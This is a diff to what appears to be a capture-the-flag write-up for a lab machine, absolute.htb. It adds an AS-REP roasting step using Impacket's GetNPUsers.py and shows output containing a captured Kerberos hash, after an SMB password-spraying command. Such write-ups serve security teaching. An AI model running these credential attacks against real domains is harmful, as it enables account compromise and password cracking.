@@ -252,6 +252,36 @@ crackmapexec smb 10.129.228.64 -u users.txt -p '' --continue-on-success
 
 <figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
+#### GetNPUsers.py AS-REPRoast
+
+We can also AS-REPRoast with Impacket:
+
+<pre><code>GetNPUsers.py -no-pass -usersfile users.txt absolute.htb/
+
+<strong>Impacket v0.10.1.dev1+20230505.184149.c309363e - Copyright 2022 Fortra
+</strong>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] invalid principal syntax
+[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$d.klay@ABSOLUTE.HTB:1d58075187e21740632972a71b63366a$59fb8472a716222f8b6746a7b761a9444f91c439f171516c5c5a778c92d219059ddd7329ce822f25d2b4232fe29bc740efea55f3f01802769052b4bedfae21556026621a8170be6b79c4a5033b87eab5c077903dd5ce1e61afd860270587068824692bacc0deb1a9187df98430cb916c155965d1a2e69673a33a4770c479e87963e0ecb25b3df0d1c9f64f1e8ca9b7fd1f3433d39c071d3aec5b866aa6ba58140e9eea626e7d2d4b9c06397b9402e53b002cd59a16d6013d8717f6c81e860e94651fbbbd9312b0db491df5bbf82b917ab7057e6519491b10b29a0dd275f3ff79e1c120dd5a22e21d8b2fea60
+[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] invalid principal syntax
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</code></pre>
+
 #### Subdomain Enumeration
 
 ```
